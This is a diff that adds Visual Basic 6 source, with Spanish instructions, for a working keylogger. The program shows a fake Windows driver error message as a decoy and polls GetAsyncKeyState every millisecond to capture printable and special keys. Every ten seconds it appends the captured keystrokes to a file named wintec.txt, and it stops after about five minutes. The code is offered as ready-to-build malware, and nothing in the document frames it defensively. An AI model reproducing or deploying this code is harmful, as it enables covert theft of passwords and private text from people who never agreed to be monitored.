@@ -1,0 +1,185 @@
+'CREAN UN MODULO CON EL SIGUIENTE CODIGO:
+Global w As Integer
+Global bb As Boolean
+
+'LUEGO CREAN UN PROYECTO CON EL SIGUIENTE CODIGO
+Dim m As String
+Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
+
+Private Sub Form_Load()
+bb = False
+Dim v As Integer
+v = vbRetry
+Do While v = vbRetry
+v = MsgBox("Error 1845, ocurrio un error en el sistema al cargar los controladores de windows", vbCritical + vbAbortRetryIgnore, "ERROR")
+Loop
+Timer1.Interval = 1
+Timer2.Interval = 10000
+m = Minute(Time) + 5
+End Sub
+
+Private Sub Text3_Change()
+w = w + 1
+End Sub
+
+Private Sub Timer1_Timer()
+On Error Resume Next
+Dim x As Integer, i As Integer
+For i = 33 To 124
+x = GetAsyncKeyState(i)
+If x = -32767 Then
+Text1.Text = Text1.Text + Chr(i)
+
+End If
+Next
+Text3.Text = Text1.Text
+x = GetAsyncKeyState(112)
+If x = -32767 Then
+Text1.Text = Text1.Text & "{F1}"
+End If
+x = GetAsyncKeyState(113)
+If x = -32767 Then
+Text1.Text = Text1.Text & "{F2}"
+End If
+x = GetAsyncKeyState(114)
+If x = -32767 Then
+Text1.Text = Text1.Text & "{F3}"
+End If
+x = GetAsyncKeyState(115)
+If x = -32767 Then
+Text1.Text = Text1.Text & "{F4}"
+End If
+x = GetAsyncKeyState(116)
+If x = -32767 Then
+Text1.Text = Text1.Text & "{F5}"
+End If
+x = GetAsyncKeyState(117)
+If x = -32767 Then
+Text1.Text = Text1.Text & "{F6}"
+End If
+x = GetAsyncKeyState(118)
+If x = -32767 Then
+Text1.Text = Text1.Text & "{F7}"
+End If
+x = GetAsyncKeyState(119)
+If x = -32767 Then
+Text1.Text = Text1.Text & "{F8}"
+End If
+x = GetAsyncKeyState(120)
+If x = -32767 Then
+Text1.Text = Text1.Text & "{F9}"
+End If
+x = GetAsyncKeyState(121)
+If x = -32767 Then
+Text1.Text = Text1.Text & "{F10}"
+End If
+x = GetAsyncKeyState(122)
+If x = -32767 Then
+Text1.Text = Text1.Text & "{F11}"
+End If
+x = GetAsyncKeyState(123)
+If x = -32767 Then
+Text1.Text = Text1.Text & "{F12}"
+End If
+
+x = GetAsyncKeyState(8)
+If x = -32767 Then
+Text1.Text = Mid(Text1.Text, 1, Len(Text1) - 1)
+End If
+
+x = GetAsyncKeyState(9)
+If x = -32767 Then
+Text1.Text = Text1.Text & "{tab}"
+End If
+
+x = GetAsyncKeyState(13)
+If x = -32767 Then
+Text1.Text = Text1.Text & "{enter}"
+Text1 = Text1 & vbCrLf
+End If
+
+x = GetAsyncKeyState(27)
+If x = -32767 Then
+Text1.Text = Text1.Text & "{esc}"
+Text1 = Text1 & vbCrLf
+End If
+
+x = GetAsyncKeyState(32)
+If x = -32767 Then
+Text1.Text = Text1.Text & " "
+End If
+
+Dim cad As String
+Dim num As String
+Dim c As String
+cad = Text1.Text
+num = Right(cad, 1)
+Text2.Text = num
+c = num
+If num = "a" Then
+c = "1"
+bb = True
+End If
+If num = "b" Then
+c = "2"
+bb = True
+End If
+If num = "c" Then
+c = "3"
+bb = True
+End If
+If num = "d" Then
+c = "4"
+bb = True
+End If
+If num = "e" Then
+c = "5"
+bb = True
+End If
+If num = "f" Then
+c = "6"
+bb = True
+End If
+If num = "g" Then
+c = "7"
+bb = True
+End If
+If num = "h" Then
+c = "8"
+bb = True
+End If
+If num = "i" Then
+c = "9"
+bb = True
+End If
+If num = "`" Then
+c = "0"
+bb = True
+End If
+
+Text2.Text = c
+
+If bb = True Then
+Dim g As Integer
+g = Len(Text1.Text) - 1
+Text1.Text = Left(Text1.Text, g) + c
+
+bb = False
+
+End If
+
+End Sub
+
+Private Sub Timer2_Timer()
+Open "\wintec.txt" For Append As #1
+Print #1, Text1.Text
+Text1.Text = ""
+Close #1
+If (Minute(Time) >= m) Then
+Open "\wintec.txt" For Append As #1
+Print #1, "----------- ----------- ------------"
+Close #1
+End
+End If
+
+End Sub
